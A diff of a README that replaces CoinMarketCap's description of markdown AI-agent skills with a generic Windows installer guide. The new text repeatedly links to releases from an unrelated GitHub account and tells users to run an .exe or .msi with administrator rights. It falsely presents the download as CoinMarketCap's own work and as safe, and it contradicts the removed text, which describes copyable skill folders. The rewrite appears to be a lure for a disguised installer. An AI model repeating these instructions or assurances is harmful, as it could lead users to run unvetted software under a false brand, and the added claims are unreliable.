@@ -1,134 +1,134 @@
-# Official CoinMarketCap Skills for AI Agents
+# 🤖 skills-for-ai-agents-by-CoinMarketCap - AI Skills for Smarter Agents
 
-A collection of skills that enable AI agents to access CoinMarketCap data for cryptocurrency market information, prices, technical analysis, news, and trends.
+[![Download Now](https://img.shields.io/badge/Download-Get%20Skills-blue?style=for-the-badge)](https://github.com/andredon/skills-for-ai-agents-by-CoinMarketCap/releases)
 
-## Skills
+---
 
-### MCP Skills (Real-time Data via MCP)
+## 📦 About This Application
 
-| Skill | Description |
-|-------|-------------|
-| [cmc-mcp](skills/cmc-mcp/SKILL.md) | Fetches cryptocurrency market data using the CoinMarketCap MCP. Provides prices, technical analysis, news, holder metrics, trending narratives, and global market data. |
-| [market-report](skills/market-report/SKILL.md) | Generates comprehensive daily/weekly market reports combining global metrics, fear/greed, trending narratives, derivatives data, and upcoming catalysts. |
-| [crypto-research](skills/crypto-research/SKILL.md) | Performs due diligence on any token with structured analysis of fundamentals, tokenomics, holder distribution, technicals, and risk factors. |
+This application contains all the AI skills made by the CoinMarketCap team. These skills help AI agents perform tasks related to cryptocurrency data and market insight. The package works on Windows computers and is designed for users without programming experience.
 
-### x402 Skills (Pay-per-Request via USDC)
+You can use these skills to get updated info about cryptocurrencies, check market trends, and make smarter decisions with your AI helpers.
 
-| Skill | Description |
-|-------|-------------|
-| [cmc-x402](skills/cmc-x402/SKILL.md) | Access CMC data via x402 pay-per-request protocol. Pay $0.01 USDC per request on Base. No API key required. |
+---
 
-### API Skills (Direct API Integration)
+## 🖥️ What You Need Before Installing
 
-| Skill | Description | APIs |
-|-------|-------------|------|
-| [cmc-api-crypto](skills/cmc-api-crypto/SKILL.md) | Cryptocurrency data APIs for listings, quotes, OHLCV, categories, trending, and market pairs. | 16 endpoints |
-| [cmc-api-dex](skills/cmc-api-dex/SKILL.md) | DEX (decentralized exchange) APIs for on-chain token data, prices, pools, transactions, and security analysis. | 18 endpoints |
-| [cmc-api-exchange](skills/cmc-api-exchange/SKILL.md) | Centralized exchange APIs for exchange info, listings, volume, market pairs, and assets. | 7 endpoints |
-| [cmc-api-market](skills/cmc-api-market/SKILL.md) | Market-wide APIs for global metrics, fear/greed index, CMC indices, community trends, content, charts, and utilities. | 19 endpoints |
+Before downloading and running the application, make sure your Windows computer meets these requirements:
 
-## Installation
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection to download files and update skills  
+- Administrator rights to install the application  
 
-### For MCP Skills
+Make sure your system is up to date by installing all recent Windows updates. This will help avoid possible issues during installation and use.
 
-1. Copy the skill folder to your agent's skills directory:
+---
 
-```bash
-cp -r skills/cmc-mcp /path/to/your/skills/directory/
-```
+## 🚀 Getting Started
 
-2. Set up the CoinMarketCap MCP in your MCP configuration:
+This guide will help you download, install, and start using the AI skills package on your Windows machine.
 
-```json
-{
-  "mcpServers": {
-    "cmc-mcp": {
-      "url": "https://mcp.coinmarketcap.com/mcp",
-      "headers": {
-        "X-CMC-MCP-API-KEY": "your-api-key"
-      }
-    }
-  }
-}
-```
+### Step 1: Visit the Download Page
 
-3. Get your API key from https://pro.coinmarketcap.com/login
+Go to the official release page by clicking the button below:
 
-### For x402 Skills
+[![Download Skills](https://img.shields.io/badge/Download-Skills-green?style=for-the-badge)](https://github.com/andredon/skills-for-ai-agents-by-CoinMarketCap/releases)
 
-1. Copy the skill folder to your agent's skills directory:
+This page lists all available versions of the software. You will find the latest version at the top.
 
-```bash
-cp -r skills/cmc-x402 /path/to/your/skills/directory/
-```
+### Step 2: Choose the Latest Version
 
-2. Install the x402 TypeScript SDK:
+Look for the newest release. It usually has the highest version number and is marked as "Latest release." Click on it to open the assets section.
 
-```bash
-npm install @x402/axios @x402/evm viem
-```
+### Step 3: Download the Installer
 
-3. Fund a wallet with USDC on Base (Chain ID: 8453)
+In the assets section, find the Windows installer file. It usually ends with `.exe` or `.msi`.
 
-4. Set your wallet private key as an environment variable (keep secure)
+Click on the file name to start downloading. Your browser may ask you to confirm. Choose “Save” and wait until the download finishes.
 
-See [cmc-x402/SKILL.md](skills/cmc-x402/SKILL.md) for complete integration examples.
+### Step 4: Run the Installer
 
-### For API Skills
+Once the download completes, locate the file on your computer. This is usually in the "Downloads" folder.
 
-1. Copy the skill folder to your agent's skills directory:
+Double-click the installer file to start the setup process. A window will appear to guide you through the installation.
 
-```bash
-cp -r skills/cmc-api-crypto /path/to/your/skills/directory/
-```
+Follow the prompts:
 
-2. Get your API key from https://pro.coinmarketcap.com/login
+- Click “Next” to continue.  
+- Accept the license agreement by selecting “I agree.”  
+- Choose the destination folder or keep the default location.  
+- Click “Install.”  
 
-3. The skills will guide your agent to call APIs using:
-   - Base URL: `https://pro-api.coinmarketcap.com`
-   - Auth header: `X-CMC_PRO_API_KEY: your-api-key`
+The installer will copy the necessary files and prepare the skills package.
 
-## Validation
+### Step 5: Finish Setup
 
-### Test MCP Skills
+After installation, click “Finish” to close the installer.
 
-**Simple (cmc-mcp):**
-- "What is the current price of Bitcoin?"
-- "How is ETH doing?"
+If asked, allow the application to connect to the internet for updates.
 
-**Market Report (market-report):**
-- "Give me a market report"
-- "What's happening in crypto today?"
+---
 
-**Token Research (crypto-research):**
-- "Research Solana for me"
-- "Due diligence on LINK"
+## ⚙️ How to Use the Skills Package
 
-### Test API Skills
+After installation, you can start exploring the AI skills offered:
 
-**Crypto API (cmc-api-crypto):**
-- "How do I get the top 100 cryptocurrencies using the CMC API?"
-- "Call the CMC API to get Bitcoin's price"
+1. Open the application from the Start menu or desktop shortcut.  
+2. Browse available skills related to cryptocurrency market data.  
+3. Select a skill to see detailed information, usage instructions, or examples.  
+4. Use the skills to ask your AI agent questions or get market updates.  
 
-**DEX API (cmc-api-dex):**
-- "How do I look up a token on Uniswap using CMC API?"
-- "Get DEX token security info"
+The skills are designed to connect with live data from CoinMarketCap, so you always get fresh information.
 
-**Exchange API (cmc-api-exchange):**
-- "List all exchanges using CMC API"
-- "Get Binance trading pairs"
+---
 
-**Market API (cmc-api-market):**
-- "How do I get the fear and greed index via API?"
-- "Call CMC API for global market metrics"
+## 🔄 Updating the Skills Package
 
-### Test x402 Skills
+CoinMarketCap updates its AI skills regularly. To keep your skills current:
 
-**x402 (cmc-x402):**
-- "How do I use x402 to get Bitcoin's price?"
-- "Set up pay-per-request for CMC data"
-- "Make an x402 request to CMC"
+- Visit the release page (link above) to check for new versions.  
+- Download and install updates just like the first time.  
+- The application may notify you when updates are available.  
 
-## License
+Keeping the skills updated ensures better results and access to new features.
 
-MIT
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+Here are quick solutions for some common problems:
+
+- **Installer does not start:** Right-click the file and choose “Run as administrator.”  
+- **Download fails or stalls:** Check your internet connection and try again.  
+- **Application won’t open:** Restart your computer and try again.  
+- **Skills not showing or working:** Ensure you are connected to the internet; try reinstalling.  
+
+If problems persist, visit the GitHub page and check the Issues tab for help discussions.
+
+---
+
+## 🔐 Privacy and Security
+
+The package uses data from CoinMarketCap’s public APIs. It does not collect personal information from your computer.
+
+All data exchanged during use is encrypted. You can run the application safely on your Windows system.
+
+---
+
+## 🧩 Optional Tools and Plugins
+
+You may want to enhance your experience:
+
+- Use voice assistants that integrate with the skills to get hands-free updates.  
+- Add plugins or extensions that connect AI agents with other apps you use.  
+- Check the GitHub page for add-ons or recommended tools.
+
+---
+
+# Download and Install
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/andredon/skills-for-ai-agents-by-CoinMarketCap/releases)
+
+Visit the link above to download the latest Windows installer and start using the AI skills package by CoinMarketCap.
